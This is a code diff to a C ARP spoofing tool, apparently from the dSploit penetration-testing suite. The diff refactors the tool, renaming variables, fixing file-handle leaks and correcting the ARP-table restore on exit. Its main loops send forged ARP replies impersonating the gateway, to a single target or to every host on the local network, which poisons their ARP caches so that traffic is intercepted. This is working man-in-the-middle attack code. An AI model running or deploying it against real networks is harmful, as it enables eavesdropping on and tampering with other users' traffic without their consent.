@@ -34,12 +34,11 @@
 #include <droid.h>
 
 #include "hashmap.h"
-#include "version.h"
 
 #define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"
 #define VOID_MAC_ADDR			 "\x00\x00\x00\x00\x00\x00"
 
-static libnet_t *l;
+static libnet_t *lnet;
 static struct ether_addr spoof_mac, target_mac;
 static in_addr_t gateway_ip, target_ip;
 static char *iface;
@@ -51,16 +50,15 @@ typedef struct {
 }
 network_entry_t;
 
-static inline int
-xdigit (char c) {
-    unsigned d;
-    d = (unsigned)(c-'0');
-    if (d < 10) return (int)d;
-    d = (unsigned)(c-'a');
-    if (d < 6) return (int)(10+d);
-    d = (unsigned)(c-'A');
-    if (d < 6) return (int)(10+d);
-    return -1;
+static inline int xdigit (char c) {
+	unsigned d;
+	d = (unsigned)(c-'0');
+	if (d < 10) return (int)d;
+	d = (unsigned)(c-'a');
+	if (d < 6) return (int)(10+d);
+	d = (unsigned)(c-'A');
+	if (d < 6) return (int)(10+d);
+	return -1;
 }
 
 /*
@@ -68,105 +66,107 @@ xdigit (char c) {
  * representation.
  * Re-entrant version (GNU extensions)
  */
-struct ether_addr *
-ether_aton_r (const char *asc, struct ether_addr * addr)
+struct ether_addr *ether_aton_r (const char *asc, struct ether_addr * addr)
 {
-    int i, val0, val1;
-    for (i = 0; i < ETHER_ADDR_LEN; ++i) {
-        val0 = xdigit(*asc);
-        asc++;
-        if (val0 < 0)
-            return NULL;
+	int i, val0, val1;
+	for (i = 0; i < ETHER_ADDR_LEN; ++i) {
+		val0 = xdigit(*asc);
+		asc++;
+		if (val0 < 0)
+			return NULL;
 
-        val1 = xdigit(*asc);
-        asc++;
-        if (val1 < 0)
-            return NULL;
+		val1 = xdigit(*asc);
+		asc++;
+		if (val1 < 0)
+			return NULL;
 
-        addr->ether_addr_octet[i] = (u_int8_t)((val0 << 4) + val1);
+		addr->ether_addr_octet[i] = (unsigned char)((val0 << 4) + val1);
 
-        if (i < ETHER_ADDR_LEN - 1) {
-            if (*asc != ':')
-                return NULL;
-            asc++;
-        }
-    }
-    if (*asc != '\0')
-        return NULL;
-    return addr;
+		if (i < ETHER_ADDR_LEN - 1) {
+			if (*asc != ':')
+				return NULL;
+			asc++;
+		}
+	}
+	if (*asc != '\0')
+		return NULL;
+	return addr;
 }
 
 /*
  * Convert Ethernet address in the standard hex-digits-and-colons to binary
  * representation.
  */
-struct ether_addr *
-ether_aton (const char *asc)
+struct ether_addr *ether_aton (const char *asc)
 {
-    static struct ether_addr addr;
-    return ether_aton_r(asc, &addr);
+	static struct ether_addr addr;
+	return ether_aton_r(asc, &addr);
 }
 
-static int arp_cache_lookup( in_addr_t address, struct ether_addr *ether, const char* lif )
+static int arp_cache_lookup( in_addr_t address, struct ether_addr *ether, const char* ifname )
 {
-	FILE *fp = fopen( "/proc/net/arp", "r" );
-	int type, flags;
-	int num;
-	unsigned entries = 0, shown = 0;
-	char ip[128];
-	char hwa[128];
-	char mask[128];
-	char line[128];
-	char dev[128];
+	int num, type, flags;
+	FILE *fp 			 = fopen( "/proc/net/arp", "r" );
+	char ip[128]   = { 0x00 },
+			 hwa[128]  = { 0x00 },
+			 mask[128] = { 0x00 },
+			 line[128] = { 0x00 },
+			 dev[128]  = { 0x00 },
+			*ipaddress = inet_ntoa( *( struct in_addr *)&address );
 
 	if( !fp ) return -1;
 
-	/* Bypass header -- read one line */
+	/*
+	 * Bypass header, read one line.
+	 */
 	fgets( line, sizeof(line), fp );
 
-	/* Read the ARP cache entries. */
-	while( fgets(line, sizeof(line), fp) )
+	while( fgets( line, sizeof(line), fp ) )
 	{
-		/* All these strings can't overflow because fgets above
-		 * reads limited amount of data
+		/*
+		 * All these strings can't overflow because fgets above reads limited amount of data
 		 */
 		num = sscanf( line, "%s 0x%x 0x%x %s %s %s\n", ip, &type, &flags, hwa, mask, dev );
-		if (num < 4)
-		{
-			printf( "Line with less than 4 expected elements.\n" );
+		if( num < 4 )
 			continue;
-		}
 
-		// not on the same interface, skip
-		if( strcmp( dev, lif ) != 0 )
-		{
-			printf( "%s != %s.\n", dev, lif );
+		/*
+		 * Not on the same interface, skip.
+		 */
+		if( strcmp( dev, ifname ) != 0 )
 			continue;
-		}
 
-		// unknown or broadcast address, skip
+		/*
+		 * Unknown or broadcast address, skip.
+		 */
 		if( strcmp( hwa, "00:00:00:00:00:00" ) == 0 || strcmp( hwa, "FF:FF:FF:FF:FF:FF" ) == 0 || strcmp( hwa, "ff:ff:ff:ff:ff:ff" ) == 0 )
 			continue;
 
-		// found!
-		if( strcmp( ip, inet_ntoa( *( struct in_addr *)&address ) ) == 0 )
+		/*
+		 * found!
+		 */
+		if( strcmp( ip, ipaddress ) == 0 )
 		{
 			memcpy( ether, (void const *)ether_aton( hwa ), sizeof( struct ether_addr ) );
 
-			printf( "FOUND %s [%s]\n", ip, hwa );
+			printf( "%s -> %s\n", ip, hwa );
+
+			fclose( fp );
 
 			return 0;
 		}
 	}
 
+	fclose( fp );
+
 	return -1;
 }
 
-static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
+static int arp_send( libnet_t *pnet, int op, unsigned char *sha, in_addr_t spa, unsigned char *tha, in_addr_t tpa )
 {
 	int retval;
 
-	if( sha == NULL && ( sha = (u_int8_t *)libnet_get_hwaddr( pnet ) ) == NULL )
+	if( sha == NULL && ( sha = (unsigned char *)libnet_get_hwaddr( pnet ) ) == NULL )
 	{
 		printf( "libnet_get_hwaddr failed : %s\n", libnet_geterror( pnet ) );
 		return -1;
@@ -181,7 +181,7 @@ static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u
 	if( tha == NULL )
 		tha = BROADCAST_MAC_ADDR;
 
-	if( libnet_autobuild_arp( arp_op, sha, (u_int8_t *)&spa, tha, (u_int8_t *)&tpa, pnet ) == -1 )
+	if( libnet_autobuild_arp( op, sha, (unsigned char *)&spa, tha, (unsigned char *)&tpa, pnet ) == -1 )
 	{
 		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
 		return -1;
@@ -212,10 +212,9 @@ static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u
 	return retval;
 }
 
-static int
-arp_find(in_addr_t ip, struct ether_addr *mac)
+static int arp_find(in_addr_t ip, struct ether_addr *mac)
 {
-	if( arp_cache_lookup(ip, mac, iface) == 0 )
+	if( arp_cache_lookup( ip, mac, iface ) == 0 )
 		return (1);
 
 	return (0);
@@ -225,38 +224,38 @@ static void cleanup(int sig)
 {
 	printf( "Restoring arp table ...\n" );
 	int i, j;
-	
+	struct ether_addr gateway_mac;
+
 	if( netmap == NULL )
 	{
-		if (arp_find(gateway_ip, &spoof_mac)) {
-			for (i = 0; i < 3; i++) {
+		if( arp_find( gateway_ip, &gateway_mac) )
+		{
+			for( i = 0; i < 3; i++ )
+			{
 				/* XXX - on BSD, requires ETHERSPOOF kernel. */
-				arp_send(l, ARPOP_REPLY,
-					 (u_int8_t *)&spoof_mac, gateway_ip,
-					 (target_ip ? (u_int8_t *)&target_mac : NULL),
-					 target_ip);
+				arp_send( lnet, ARPOP_REPLY, (unsigned char *)&gateway_mac, gateway_ip, (unsigned char *)&target_mac, target_ip );
 				sleep(1);
 			}
 		}
 	}
 	else
 	{
-		if( arp_find( gateway_ip, &spoof_mac ) )
+		if( arp_find( gateway_ip, &gateway_mac ) )
 		{
 			for( i = 0; i < 3; i++ )
 			{
 				for( j = 0; j < netmap->bucketCount; j++ )
 				{
-						Entry* hentry = netmap->buckets[j];
-						while( hentry != NULL )
-						{
-								Entry 					*next  = hentry->next;
-								network_entry_t *entry = ( network_entry_t * )hentry->value;
+					Entry* hentry = netmap->buckets[j];
+					while( hentry != NULL )
+					{
+						Entry 					*next  = hentry->next;
+						network_entry_t *entry = ( network_entry_t * )hentry->value;
 
-								arp_send( l, ARPOP_REPLY, (u_int8_t *)&spoof_mac, gateway_ip, entry->mac, entry->address );
+						arp_send( lnet, ARPOP_REPLY, (unsigned char *)&gateway_mac, gateway_ip, entry->mac, entry->address );
 
-								hentry = next;
-						}
+						hentry = next;
+					}
 				}
 
 				sleep(1);
@@ -284,53 +283,55 @@ int main(int argc, char *argv[])
 	char pcap_ebuf[PCAP_ERRBUF_SIZE];
 	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
 	int  c;
-	
+
 	iface			 = NULL;
 	gateway_ip = target_ip = 0;
-	
+
+	printf( "dSploit ArpSpoofer.\n\n" );
+
 	while( (c = getopt(argc, argv, "i:t:h?V")) != -1)
 	{
 		switch (c)
 		{
-			case 'i':
-				iface = optarg;
-				break;
-			case 't':
-				if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
-					exit(1);
-				break;
-			default:
+		case 'i':
+			iface = optarg;
+			break;
+		case 't':
+			if ((target_ip = libnet_name2addr4(lnet, optarg, LIBNET_RESOLVE)) == -1)
 				exit(1);
+			break;
+		default:
+			exit(1);
 		}
 	}
 	argc -= optind;
 	argv += optind;
-	
+
 	if (argc != 1)
 		exit(1);
-	
-	if ((gateway_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
+
+	if ((gateway_ip = libnet_name2addr4(lnet, argv[0], LIBNET_RESOLVE)) == -1)
 		exit(1);
-	
+
 	if (iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL) {
 		printf( "%s\n", pcap_ebuf);
 		exit(1);
 	}
 
-	if ((l = libnet_init(LIBNET_LINK, iface, libnet_ebuf)) == NULL) {
+	if ((lnet = libnet_init(LIBNET_LINK, iface, libnet_ebuf)) == NULL) {
 		printf( "%s\n", libnet_ebuf);
 		exit(1);
 	}
-	
+
 	if (target_ip != 0 && !arp_find(target_ip, &target_mac)) {
 		printf( "couldn't arp for host %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
 		exit(1);
 	}
-	
+
 	signal( SIGHUP, cleanup );
 	signal( SIGINT, cleanup );
 	signal( SIGTERM, cleanup );
-	
+
 	// single ip spoofing
 	if( target_ip != 0 )
 	{
@@ -338,7 +339,7 @@ int main(int argc, char *argv[])
 
 		for (;;)
 		{
-			arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
+			arp_send( lnet, ARPOP_REPLY, NULL, gateway_ip, (unsigned char *)&target_mac, target_ip );
 			sleep(1);
 		}
 	}
@@ -352,7 +353,7 @@ int main(int argc, char *argv[])
 				nhosts  = 0,
 				i;
 		pcap_if_t *ifaces = NULL,
-						  *pcap_iface;
+				*pcap_iface;
 		pcap_addr_t *pcap_address;
 		network_entry_t *entry;
 
@@ -420,7 +421,7 @@ int main(int argc, char *argv[])
 				entry = hashmapGet( netmap, (void *)target_ip );
 				if( entry )
 				{
-					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (u_int8_t *)&entry->mac, target_ip );
+					arp_send( lnet, ARPOP_REPLY, NULL, gateway_ip, (unsigned char *)&entry->mac, target_ip );
 				}
 			}
 
